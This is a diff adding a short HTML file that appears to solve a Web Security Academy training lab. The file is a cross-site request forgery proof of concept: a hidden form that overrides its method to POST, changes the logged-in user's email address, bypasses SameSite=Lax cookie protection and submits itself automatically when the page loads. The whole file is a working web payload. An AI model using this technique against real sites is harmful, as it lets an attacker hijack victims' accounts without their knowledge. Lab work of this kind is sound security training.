@@ -1,0 +1,14 @@
+<html>
+  <!-- By pass samesite=Lax via Post method injection in the form -->
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="https://0aeb00f8034d2fd08027eeed00340023.web-security-academy.net/my-account/change-email" method="GET">
+      <input type="hidden" name="_method" value="POST" />
+      <input type="hidden" name="email" value="pwd&#64;pwd&#46;com" />
+      <input type="submit" value="Submit request" />
+    </form>
+<script>
+document.forms[0].submit();
+</script>
+  </body>
+</html>
